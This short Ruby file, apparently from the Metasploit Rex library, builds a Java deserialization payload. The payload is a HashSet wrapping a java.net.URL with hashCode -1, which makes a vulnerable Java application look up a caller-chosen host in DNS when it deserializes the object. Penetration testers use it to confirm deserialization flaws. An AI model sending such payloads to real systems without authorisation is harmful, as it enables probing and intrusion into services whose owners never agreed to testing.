# -*- coding: binary -*-
require 'rex/java/serialization/metamodel'
require_relative 'util'

module Rex
  module Java
    module Serialization
      module Payloads
        class URL
          def make_dns_lookup(host)
            url = Model::JavaObject.new('Ljava/net/URL;', 
                                        'protocol' => 'http',
                                        'host' => host,
                                        'hashCode' => -1)
            Model::JavaObject.new('Ljava/util/HashSet;', 'elements' => [url])
          end
        end
      end
    end
  end
end
